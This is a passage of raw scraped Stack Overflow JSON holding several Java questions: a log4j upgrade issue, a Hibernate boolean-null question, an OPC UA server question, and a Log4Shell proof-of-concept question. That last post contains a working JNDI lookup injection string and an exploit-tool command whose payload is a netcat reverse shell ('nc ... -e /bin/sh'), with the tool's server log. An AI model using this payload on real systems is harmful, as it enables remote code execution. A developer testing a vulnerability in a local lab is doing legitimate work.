&lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;\r\n        &lt;/properties&gt;\r\n    \r\n        &lt;dependencyManagement&gt;\r\n                        &lt;!-- *********** --&gt;\r\n                &lt;!-- Spring      --&gt;\r\n                &lt;!-- *********** --&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-framework-bom&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring.version}&lt;/version&gt;\r\n                    &lt;type&gt;pom&lt;/type&gt;\r\n                    &lt;scope&gt;import&lt;/scope&gt;\r\n                &lt;/dependency&gt;\r\n    \r\n                &lt;!-- Spring Data  --&gt;\r\n    \r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-data-jpa&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring.data.version}&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;!-- Spring Integration     --&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-integration-core&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring.integration.version}&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-integration-file&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring.integration.version}&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;spring-integration-jdbc&lt;/artifactId&gt;\r\n                    &lt;version&gt;${spring.integration.version}&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n    \r\n                &lt;!-- *********** --&gt;\r\n                &lt;!-- Logging     --&gt;\r\n                &lt;!-- *********** --&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\r\n                    &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\r\n                    &lt;version&gt;${slf4j.version}&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\r\n                    &lt;version&gt;2.17.0&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\r\n                    &lt;version&gt;2.17.0&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n                &lt;dependency&gt;\r\n                    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\r\n                    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\r\n                    &lt;version&gt;2.17.0&lt;/version&gt;\r\n                &lt;/dependency&gt;\r\n    \r\n        &lt;/dependencies&gt;\r\n        &lt;/dependencyManagement&gt;\r\n\r\n\r\n","title":"Log4j-jul-2.11.2 issue: Log 4j-Jul produced on deployment","body":"<p>Need a help as I am working on log4j Vulnerability issue. I am working on intellij. I have changed the dependency to point to 2.17.0. However log4j-jul-2.11.2 jar is getting generated.</p>\n<p>-rw-r--r--. 1 mdXXX mdpXXX   23998 Jan  8  2021 log4j-jul-2.11.2.jar</p>\n<p>This log4j-jul is being picked up from external libraries from Maven. I removed this dependency from library. But its still creating a jar as mentioned above. Any pointers would be helpful.</p>\n<p>Adding Pom</p>\n<pre><code>&lt;properties&gt;\n        &lt;java.version&gt;1.8&lt;/java.version&gt;\n        &lt;spring.version&gt;4.1.6.RELEASE&lt;/spring.version&gt;\n        &lt;spring.data.version&gt;1.8.0.RELEASE&lt;/spring.data.version&gt;\n      \n   &lt;spring.integration.version&gt;4.1.2.RELEASE&lt;/spring.integration.version&gt;\n        &lt;slf4j.version&gt;1.6.1&lt;/slf4j.version&gt;\n        &lt;junit.version&gt;4.12&lt;/junit.version&gt;\n        &lt;testng.version&gt;6.8.21&lt;/testng.version&gt;\n        &lt;dbunit.version&gt;2.4.8&lt;/dbunit.version&gt;\n        &lt;mockito.version&gt;1.9.5&lt;/mockito.version&gt;\n        &lt;spring.dbunit.version&gt;1.2.0&lt;/spring.dbunit.version&gt;\n        &lt;hsqldb.version&gt;2.3.2&lt;/hsqldb.version&gt;\n        &lt;h2.version&gt;1.4.185&lt;/h2.version&gt;\n        &lt;ojdbc6.version&gt;11.2.0.2.0&lt;/ojdbc6.version&gt;\n        &lt;wiremock.version&gt;1.40&lt;/wiremock.version&gt;\n        &lt;csv.version&gt;1.1&lt;/csv.version&gt;\n        &lt;dbcp.version&gt;1.4&lt;/dbcp.version&gt;\n        &lt;io.version&gt;2.4&lt;/io.version&gt;\n        &lt;velocity.version&gt;1.7&lt;/velocity.version&gt;\n        &lt;ucp.version&gt;11.2.0.3&lt;/ucp.version&gt;\n        &lt;joda.time.version&gt;2.7&lt;/joda.time.version&gt;\n        &lt;hibernate.entitymanager.version&gt;4.3.9.Final&lt;/hibernate.entitymanager.version&gt;\n        &lt;hibernate.jpa.version&gt;1.0.0.Final&lt;/hibernate.jpa.version&gt;\n        &lt;json.version&gt;2.1-rev7&lt;/json.version&gt;\n\n        &lt;surefire.plugin.version&gt;2.18.1&lt;/surefire.plugin.version&gt;\n        &lt;failsafe.plugin.version&gt;2.18.1&lt;/failsafe.plugin.version&gt;\n        &lt;compiler.plugin.version&gt;3.3&lt;/compiler.plugin.version&gt;\n        &lt;assembly.plugin.version&gt;3.0.0&lt;/assembly.plugin.version&gt;\n        &lt;release.plugin.version&gt;2.3.2&lt;/release.plugin.version&gt;\n        &lt;pmd.plugin.version&gt;3.8&lt;/pmd.plugin.version&gt;\n        &lt;checkstyle.plugin.version&gt;2.13&lt;/checkstyle.plugin.version&gt;\n        &lt;rulesets-directory&gt;build&lt;/rulesets-directory&gt;\n\n        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;\n    &lt;/properties&gt;\n\n    &lt;dependencyManagement&gt;\n                    &lt;!-- *********** --&gt;\n            &lt;!-- Spring      --&gt;\n            &lt;!-- *********** --&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-framework-bom&lt;/artifactId&gt;\n                &lt;version&gt;${spring.version}&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n\n            &lt;!-- Spring Data  --&gt;\n\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.data&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-data-jpa&lt;/artifactId&gt;\n                &lt;version&gt;${spring.data.version}&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;!-- Spring Integration     --&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-integration-core&lt;/artifactId&gt;\n                &lt;version&gt;${spring.integration.version}&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-integration-file&lt;/artifactId&gt;\n                &lt;version&gt;${spring.integration.version}&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.integration&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-integration-jdbc&lt;/artifactId&gt;\n                &lt;version&gt;${spring.integration.version}&lt;/version&gt;\n            &lt;/dependency&gt;\n\n            &lt;!-- *********** --&gt;\n            &lt;!-- Logging     --&gt;\n            &lt;!-- *********** --&gt;\n            &lt;dependency&gt;\n                &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;\n                &lt;groupId&gt;org.slf4j&lt;/groupId&gt;\n                &lt;version&gt;${slf4j.version}&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n                &lt;artifactId&gt;log4j-slf4j-impl&lt;/artifactId&gt;\n                &lt;version&gt;2.17.0&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n                &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;\n                &lt;version&gt;2.17.0&lt;/version&gt;\n            &lt;/dependency&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;\n                &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;\n                &lt;version&gt;2.17.0&lt;/version&gt;\n            &lt;/dependency&gt;\n\n    &lt;/dependencies&gt;\n    &lt;/dependencyManagement&gt;\n</code></pre>\n"},{"tags":["java","security","jsp","tomcat","log4j2"],"comments":[{"owner":{"account_id":4447550,"reputation":11,"user_id":3620439,"display_name":"user3620439"},"score":0,"creation_date":1640349786,"post_id":70461898,"comment_id":124574982,"body_markdown":"Java version s the key. \n8.181.13-r0 ... log4shell [OK]\n8.275.01-r0 ... [NOK]","body":"Java version s the key.  8.181.13-r0 ... log4shell [OK] 8.275.01-r0 ... [NOK]"}],"owner":{"account_id":4447550,"reputation":11,"user_id":3620439,"display_name":"user3620439"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":698,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":0,"score":1,"last_activity_date":1640260952,"creation_date":1640260952,"question_id":70461898,"body_markdown":"I&#39;m trying to make a simple POC with JSP/tomcat... \r\n\r\nOn one side : the JSP part (with log4j-core/log4j-api)\r\n\r\n```\r\n&lt;%@ page import=&quot;org.apache.logging.log4j.Logger&quot; %&gt;\r\n&lt;%@ page import=&quot;org.apache.logging.log4j.LogManager&quot; %&gt;\r\n&lt;html&gt;\r\n    &lt;head&gt;\r\n        &lt;title&gt;Demonstration log4j usage in jsp&lt;/title&gt;\r\n    &lt;/head&gt;\r\n    &lt;body&gt;\r\n&lt;%\r\nLogger logger = LogManager.getLogger(&quot;Elt&quot;);\r\nlogger.error(&quot;${jndi:ldap://127.0.0.1:1389/tf2ryx}&quot;);\r\n\r\n%&gt;\r\n    &lt;/body&gt;\r\n&lt;/html&gt;\r\n```\r\n\r\nOn other side:\r\n```\r\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 127.0.0.1 9999 -e /bin/sh&quot; -A 127.0.0.1\r\n[ADDRESS] &gt;&gt; 127.0.0.1\r\n[COMMAND] &gt;&gt; nc 127.0.0.1 9999 -e /bin/sh\r\n----------------------------JNDI Links---------------------------- \r\nTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):\r\nrmi://127.0.0.1:1099/00epyj\r\nTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):\r\nrmi://127.0.0.1:1099/qamx3t\r\nldap://127.0.0.1:1389/qamx3t\r\nTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):\r\nrmi://127.0.0.1:1099/tf2ryx\r\nldap://127.0.0.1:1389/tf2ryx\r\n\r\n----------------------------Server Log----------------------------\r\n2021-12-23 06:54:23 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180\r\n2021-12-23 06:54:23 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099\r\n2021-12-23 06:54:23 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389\r\n2021-12-23 06:54:39 [LDAPSERVER] &gt;&gt; Send LDAP reference result for tf2ryx redirecting to http://127.0.0.1:8180/ExecTemplateJDK8.class\r\n```\r\n\r\n\r\n- First call to ldap works.\r\n- But Redirection to bad class not.\r\n\r\nI don&#39;t know where is my mistake.\r\n\r\n\r\n\r\n","title":"Log4Shell POC jsp/tomcat","body":"<p>I'm trying to make a simple POC with JSP/tomcat...</p>\n<p>On one side : the JSP part (with log4j-core/log4j-api)</p>\n<pre><code>&lt;%@ page import=&quot;org.apache.logging.log4j.Logger&quot; %&gt;\n&lt;%@ page import=&quot;org.apache.logging.log4j.LogManager&quot; %&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;title&gt;Demonstration log4j usage in jsp&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n&lt;%\nLogger logger = LogManager.getLogger(&quot;Elt&quot;);\nlogger.error(&quot;${jndi:ldap://127.0.0.1:1389/tf2ryx}&quot;);\n\n%&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<p>On other side:</p>\n<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;nc 127.0.0.1 9999 -e /bin/sh&quot; -A 127.0.0.1\n[ADDRESS] &gt;&gt; 127.0.0.1\n[COMMAND] &gt;&gt; nc 127.0.0.1 9999 -e /bin/sh\n----------------------------JNDI Links---------------------------- \nTarget environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):\nrmi://127.0.0.1:1099/00epyj\nTarget environment(Build in JDK 1.7 whose trustURLCodebase is true):\nrmi://127.0.0.1:1099/qamx3t\nldap://127.0.0.1:1389/qamx3t\nTarget environment(Build in JDK 1.8 whose trustURLCodebase is true):\nrmi://127.0.0.1:1099/tf2ryx\nldap://127.0.0.1:1389/tf2ryx\n\n----------------------------Server Log----------------------------\n2021-12-23 06:54:23 [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:8180\n2021-12-23 06:54:23 [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:1099\n2021-12-23 06:54:23 [LDAPSERVER] &gt;&gt; Listening on 0.0.0.0:1389\n2021-12-23 06:54:39 [LDAPSERVER] &gt;&gt; Send LDAP reference result for tf2ryx redirecting to http://127.0.0.1:8180/ExecTemplateJDK8.class\n</code></pre>\n<ul>\n<li>First call to ldap works.</li>\n<li>But Redirection to bad class not.</li>\n</ul>\n<p>I don't know where is my mistake.</p>\n"},{"tags":["java","spring","hibernate"],"comments":[{"owner":{"account_id":340779,"reputation":4695,"user_id":670994,"accept_rate":62,"display_name":"Hip Hip Array"},"score":1,"creation_date":1350915337,"post_id":13013227,"comment_id":17659333,"body_markdown":"yes I know the differences between boolean and Boolean, my application is throwing this exception because spring/hibernate is trying to set atShop to null instead of false, but how can i get it to set it to false and not null?","body":"yes I know the differences between boolean and Boolean, my application is throwing this exception because spring/hibernate is trying to set atShop to null instead of false, but how can i get it to set it to false and not null?"},{"owner":{"account_id":357454,"reputation":77335,"user_id":697630,"accept_rate":84,"display_name":"Edwin Dalorzo"},"score":3,"creation_date":1350915636,"post_id":13013227,"comment_id":17659463,"body_markdown":"Gee, I hate it when people downvote answers without any explanation and only because they are not exactly what they are looking for. Above all in a question like this which was not originally clear enough. It makes me lose my will to try to help.","body":"Gee, I hate it when people downvote answers without any explanation and only because they are not exactly what they are looking for. Above all in a question like this which was not originally clear enough. It makes me lose my will to try to help."},{"owner":{"account_id":340779,"reputation":4695,"user_id":670994,"accept_rate":62,"display_name":"Hip Hip Array"},"score":0,"creation_date":1350915728,"post_id":13013227,"comment_id":17659512,"body_markdown":"@Edwin Dalorzo: But it was not me who down voted the answers, that is why i added the edit section to my question because it was my fault that i did not explain that i already understood the differences between boolean and Boolean","body":"@Edwin Dalorzo: But it was not me who down voted the answers, that is why i added the edit section to my question because it was my fault that i did not explain that i already understood the differences between boolean and Boolean"},{"owner":{"account_id":1256982,"reputation":1626,"user_id":1216246,"accept_rate":65,"display_name":"Oscar Castiblanco"},"score":0,"creation_date":1350916653,"post_id":13013227,"comment_id":17660001,"body_markdown":"As soon as I know, boolean in the database will be mapped as 1 or 0, so you don&#39;t need columnDefinition. If you want to be sure, you can add the mapping in the persistence file like that &lt;property name=&quot;hibernate.query.substitutions&quot;&gt;true 1, false 0&lt;/property&gt;","body":"As soon as I know, boolean in the database will be mapped as 1 or 0, so you don&#39;t need columnDefinition. If you want to be sure, you can add the mapping in the persistence file like that &lt;property name=&quot;hibernate.query.substitutions&quot;&gt;true 1, false 0&lt;/property&gt;"}],"answers":[{"tags":[],"owner":{"account_id":1355206,"reputation":33312,"user_id":1293744,"accept_rate":44,"display_name":"Kumar Vivek Mitra"},"down_vote_count":1,"up_vote_count":49,"is_accepted":true,"score":48,"last_activity_date":1350915134,"creation_date":1350915134,"answer_id":13013273,"question_id":13013227,"body_markdown":"**-** `boolean` is a **primitive type**, and can have a value of only `true or false`.\r\n\r\n**-** Whereas `Boolean` is a **Wrapper Object** and can be given a **null** value.\r\n\r\n**-** From `Java 1.5` `AutoBoxing` is provided, so you can **convert boolean to Boolean and back to boolean with Simple assignment operator** (`=`), So you can do this in places where you want Boolean instead of boolean.","title":"Cannot set boolean to null","body":"<p><strong>-</strong> <code>boolean</code> is a <strong>primitive type</strong>, and can have a value of only <code>true or false</code>.</p>\n\n<p><strong>-</strong> Whereas <code>Boolean</code> is a <strong>Wrapper Object</strong> and can be given a <strong>null</strong> value.</p>\n\n<p><strong>-</strong> From <code>Java 1.5</code> <code>AutoBoxing</code> is provided, so you can <strong>convert boolean to Boolean and back to boolean with Simple assignment operator</strong> (<code>=</code>), So you can do this in places where you want Boolean instead of boolean.</p>\n"},{"tags":[],"owner":{"account_id":1796629,"reputation":808,"user_id":1635905,"accept_rate":86,"display_name":"bmlynarczyk"},"down_vote_count":1,"up_vote_count":2,"is_accepted":false,"score":1,"last_activity_date":1350917706,"creation_date":1350915221,"answer_id":13013291,"question_id":13013227,"body_markdown":"`boolean` is primitive it could be `true` or `false` and default is `false`. To obtain `null`, it&#39;s object type is `Boolean`.\r\n","title":"Cannot set boolean to null","body":"<p><code>boolean</code> is primitive it could be <code>true</code> or <code>false</code> and default is <code>false</code>. To obtain <code>null</code>, it's object type is <code>Boolean</code>.</p>\n"},{"tags":[],"owner":{"account_id":451585,"reputation":4900,"user_id":847553,"accept_rate":86,"display_name":"Dave Richardson"},"down_vote_count":0,"up_vote_count":10,"is_accepted":false,"score":10,"last_activity_date":1350916104,"creation_date":1350916104,"answer_id":13013571,"question_id":13013227,"body_markdown":"Rather than fiddle with the hibernate code, change your table definition to default null values to false (or 0). That way when you come to read from the database it will always have valid values (which, since it&#39;s boolean, makes more sense)","title":"Cannot set boolean to null","body":"<p>Rather than fiddle with the hibernate code, change your table definition to default null values to false (or 0). That way when you come to read from the database it will always have valid values (which, since it's boolean, makes more sense)</p>\n"},{"tags":[],"owner":{"account_id":1086765,"reputation":9377,"user_id":1082300,"accept_rate":50,"display_name":"Steve Ebersole"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1350920343,"creation_date":1350920343,"answer_id":13014853,"question_id":13013227,"body_markdown":"`null` is not the same as `false` (nor is it the same as `true`).  `null` has a very specific meaning.  That is why Hibernate does what it does... because it is really the only thing that makes sense, despite what you think it should do.  \r\n\r\nIf you want to instruct Hibernate to treat `null` in those columns as false, the only real solution is to develop a custom Hibernate Type mapping for this special treatment of &quot;null is not really a null&quot;.  You can accomplish that by either implementing the `org.hibernate.type.Type` interface, or the `org.hibernate.usertype.UserType` interface.  You best bet is to extend the standard boolean Type mapping and weave in the special null handling.  \r\n\r\nOne thing to be careful of, however, is querying since checking equality against `null` is never valid in ANSI SQL.  It resolves to what SQL calls `UNDEFINED`, which usually means `FALSE`.","title":"Cannot set boolean to null","body":"<p><code>null</code> is not the same as <code>false</code> (nor is it the same as <code>true</code>).  <code>null</code> has a very specific meaning.  That is why Hibernate does what it does... because it is really the only thing that makes sense, despite what you think it should do.  </p>\n\n<p>If you want to instruct Hibernate to treat <code>null</code> in those columns as false, the only real solution is to develop a custom Hibernate Type mapping for this special treatment of \"null is not really a null\".  You can accomplish that by either implementing the <code>org.hibernate.type.Type</code> interface, or the <code>org.hibernate.usertype.UserType</code> interface.  You best bet is to extend the standard boolean Type mapping and weave in the special null handling.  </p>\n\n<p>One thing to be careful of, however, is querying since checking equality against <code>null</code> is never valid in ANSI SQL.  It resolves to what SQL calls <code>UNDEFINED</code>, which usually means <code>FALSE</code>.</p>\n"},{"tags":[],"owner":{"account_id":3681521,"reputation":1,"user_id":3066377,"display_name":"Final"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1386169403,"creation_date":1386169403,"answer_id":20378762,"question_id":13013227,"body_markdown":"You do know you could just put a try catch around it if it throws an exception that means it was null, therefore set it to false.","title":"Cannot set boolean to null","body":"<p>You do know you could just put a try catch around it if it throws an exception that means it was null, therefore set it to false.</p>\n"},{"tags":[],"owner":{"account_id":6375843,"reputation":591,"user_id":4946819,"display_name":"JamesD"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640260854,"creation_date":1640260854,"answer_id":70461886,"question_id":13013227,"body_markdown":"Thought I&#39;d give my 2 cents on this since I had a similar issue but the solution was different.\r\n\r\nSo my issue was that it was retrieving data from the database and trying to save that data back. The data it retrieved for the boolean field was null. So when it tried to save it back it complained that it can&#39;t save null to a boolean. \r\n\r\nThe fix was to update the database data so none of these fields had null values.\r\n","title":"Cannot set boolean to null","body":"<p>Thought I'd give my 2 cents on this since I had a similar issue but the solution was different.</p>\n<p>So my issue was that it was retrieving data from the database and trying to save that data back. The data it retrieved for the boolean field was null. So when it tried to save it back it complained that it can't save null to a boolean.</p>\n<p>The fix was to update the database data so none of these fields had null values.</p>\n"}],"owner":{"account_id":340779,"reputation":4695,"user_id":670994,"accept_rate":62,"display_name":"Hip Hip Array"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":70914,"favorite_count":0,"down_vote_count":1,"up_vote_count":24,"accepted_answer_id":13013273,"answer_count":6,"score":23,"last_activity_date":1640260854,"creation_date":1350915005,"question_id":13013227,"body_markdown":"I have a class Shop with the following variable\r\n\r\n\t@Column(columnDefinition = &quot;bit&quot;)\r\n\tprivate boolean atShop;\r\n\r\nUsing this value, I am using HSQL to retrieve this information from the application\r\n\r\n    from Person person\r\n    left join fetch person.shop\r\n\r\nwhen I try call this HSQL statement i get the following error\r\n\r\n    org.springframework.orm.hibernate3.HibernateSystemException: could not set a field value by reflection setter of com.test.dataobject.Shop.atShop; nested exception is org.hibernate.PropertyAccessException: could not set a field value by reflection setter of com.test.dataobject.Shop.atShop\r\n\r\nIt is throwing this because it is trying to set the boolean to null in the HSQL. I can solve this problem by changing `private boolean atShop;` to `private Boolean atShop;` but i want to keep this as a `boolean` as i am saving it as a bit in my database\r\n\r\nIs there a way to solve this without changing `boolean` to `Boolean`?\r\n\r\n**EDIT:** \r\n\r\nI know that boolean can only be true/false and Boolean can be set to null, but is there a way to get hibernate/spring to set this value to false(which i thought it should do automatically) instead of trying to set it to null and throwing this exception?\r\n\r\nI have also tried adding annotation to automatically set the value to false but this does not work either\r\n\r\n    @Column(nullable = false, columnDefinition = &quot;bit default 0&quot;)\r\n    private boolean atShop;\r\n\r\n","title":"Cannot set boolean to null","body":"<p>I have a class Shop with the following variable</p>\n\n<pre><code>@Column(columnDefinition = \"bit\")\nprivate boolean atShop;\n</code></pre>\n\n<p>Using this value, I am using HSQL to retrieve this information from the application</p>\n\n<pre><code>from Person person\nleft join fetch person.shop\n</code></pre>\n\n<p>when I try call this HSQL statement i get the following error</p>\n\n<pre><code>org.springframework.orm.hibernate3.HibernateSystemException: could not set a field value by reflection setter of com.test.dataobject.Shop.atShop; nested exception is org.hibernate.PropertyAccessException: could not set a field value by reflection setter of com.test.dataobject.Shop.atShop\n</code></pre>\n\n<p>It is throwing this because it is trying to set the boolean to null in the HSQL. I can solve this problem by changing <code>private boolean atShop;</code> to <code>private Boolean atShop;</code> but i want to keep this as a <code>boolean</code> as i am saving it as a bit in my database</p>\n\n<p>Is there a way to solve this without changing <code>boolean</code> to <code>Boolean</code>?</p>\n\n<p><strong>EDIT:</strong> </p>\n\n<p>I know that boolean can only be true/false and Boolean can be set to null, but is there a way to get hibernate/spring to set this value to false(which i thought it should do automatically) instead of trying to set it to null and throwing this exception?</p>\n\n<p>I have also tried adding annotation to automatically set the value to false but this does not work either</p>\n\n<pre><code>@Column(nullable = false, columnDefinition = \"bit default 0\")\nprivate boolean atShop;\n</code></pre>\n"},{"tags":["java","server","opc-ua"],"answers":[{"tags":[],"owner":{"account_id":124881,"reputation":2119,"user_id":1282835,"accept_rate":82,"display_name":"Jouni Aro"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640260742,"creation_date":1640260742,"answer_id":70461869,"question_id":70459281,"body_markdown":"Please, take a look at the SampleConsoleServer project which is a more complete server. And read the Tutorial that explains the details.","title":"Add variable to Java OPCUA server","body":"<p>Please, take a look at the SampleConsoleServer project which is a more complete server. And read the Tutorial that explains the details.</p>\n"}],"owner":{"account_id":23726749,"reputation":11,"user_id":17746546,"display_name":"tibs"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":109,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640260742,"creation_date":1640246773,"question_id":70459281,"body_markdown":"I would like to use a java OPC UA server with the prosys OPCUA SDK.\r\nI&#39;m able to start a server with the SimpleServer program but I don&#39;t understand how to host variable in this server as boolean, integer...\r\n\r\nHere the code I&#39;m using from the package, it start a server but it is empty.\r\n\r\n``` \r\npublic class SimpleServer {\r\n\r\n  public static void main(String[] args) throws Exception {\r\n    UaServer server = new UaServer();\r\n\r\n    if (System.getProperty(&quot;java.version&quot;).startsWith(&quot;1.6&quot;)) {\r\n      server.setEnableIPv6(false);\r\n    }\r\n\r\n    server.setPort(Protocol.OpcTcp, 52530);\r\n    server.setServerName(&quot;OPCUA/SimpleServer&quot;);\r\n    server.setBindAddresses(EndpointUtil.getInetAddresses(server.isEnableIPv6()));\r\n\r\n    server.getSecurityModes().add(SecurityMode.NONE);\r\n    server.getSecurityModes().addAll(SecurityMode.combinations(\r\n        EnumSet.of(MessageSecurityMode.Sign, MessageSecurityMode.SignAndEncrypt), SecurityPolicy.ALL_SECURE_104));\r\n\r\n    server.addUserTokenPolicy(UserTokenPolicies.ANONYMOUS);\r\n    server.setCertificateValidator(new DefaultCertificateValidator(new PkiDirectoryCertificateStore()));\r\n\r\n    initializeApplicationIdentity(server);\r\n\r\n    // Starts the server\r\n    server.start();\r\n\r\n    // Prints connection address that clients can use.\r\n    System.out.println(&quot;Server started, connection address:&quot;);\r\n    System.out.println(server.getEndpoints()[0].getEndpointUrl());\r\n\r\n    //I think the variable should be add here\r\n\r\n    // Wait for shutdown\r\n    System.out.println(&quot;Enter &#39;x&#39; to shutdown&quot;);\r\n    Scanner sc = new Scanner(System.in);\r\n    sc.nextLine(); // blocks until input given\r\n    System.out.println(&quot;Shutting down..&quot;);\r\n    server.shutdown(2, new LocalizedText(&quot;Shutdown by user&quot;));\r\n    System.out.println(&quot;Server stopped.&quot;);\r\n  }\r\n\r\n  /**\r\n   * Define a minimal ApplicationIdentity.\r\n   */\r\n  private static void initializeApplicationIdentity(UaServer server)\r\n      throws SecureIdentityException, IOException, UnknownHostException {\r\n    ApplicationDescription appDescription = new ApplicationDescription();\r\n    appDescription.setApplicationName(new LocalizedText(&quot;SimpleServer&quot;, Locale.ENGLISH));\r\n\r\n    appDescription.setApplicationUri(&quot;urn:localhost:UA:SimpleServer&quot;);\r\n    appDescription.setProductUri(&quot;urn:prosysopc.com:UA:SimpleServer&quot;);\r\n    appDescription.setApplicationType(ApplicationType.Server);\r\n\r\n    File privateKeyPath = new File(&quot;PKI/CA/private&quot;);\r\n    String organization = &quot;Sample Organization&quot;;\r\n    String privateKeyPassword = &quot;opcua&quot;;\r\n    ApplicationIdentity identity = ApplicationIdentity.loadOrCreateCertificate(appDescription, organization,\r\n        privateKeyPassword, privateKeyPath, true);\r\n    server.setApplicationIdentity(identity);\r\n  }\r\n\r\n} ```","title":"Add variable to Java OPCUA server","body":"<p>I would like to use a java OPC UA server with the prosys OPCUA SDK.\nI'm able to start a server with the SimpleServer program but I don't understand how to host variable in this server as boolean, integer...</p>\n<p>Here the code I'm using from the package, it start a server but it is empty.</p>\n<pre><code>public class SimpleServer {\n\n  public static void main(String[] args) throws Exception {\n    UaServer server = new UaServer();\n\n    if (System.getProperty(&quot;java.version&quot;).startsWith(&quot;1.6&quot;)) {\n      server.setEnableIPv6(false);\n    }\n\n    server.setPort(Protocol.OpcTcp, 52530);\n    server.setServerName(&quot;OPCUA/SimpleServer&quot;);\n    server.setBindAddresses(EndpointUtil.getInetAddresses(server.isEnableIPv6()));\n\n    server.getSecurityModes().add(SecurityMode.NONE);\n    server.getSecurityModes().addAll(SecurityMode.combinations(\n        EnumSet.of(MessageSecurityMode.Sign, MessageSecurityMode.SignAndEncrypt), SecurityPolicy.ALL_SECURE_104));\n\n    server.addUserTokenPolicy(UserTokenPolicies.ANONYMOUS);\n    server.setCertificateValidator(new DefaultCertificateValidator(new PkiDirectoryCertificateStore()));\n\n    initializeApplicationIdentity(server);\n\n    // Starts the server\n    server.start();\n\n    // Prints connection address that clients can use.\n    System.out.println(&quot;Server started, connection address:&quot;);\n    System.out.println(server.getEndpoints()[0].getEndpointUrl());\n\n    //I think the variable should be add here\n\n    // Wait for shutdown\n    System.out.println(&quot;Enter 'x' to 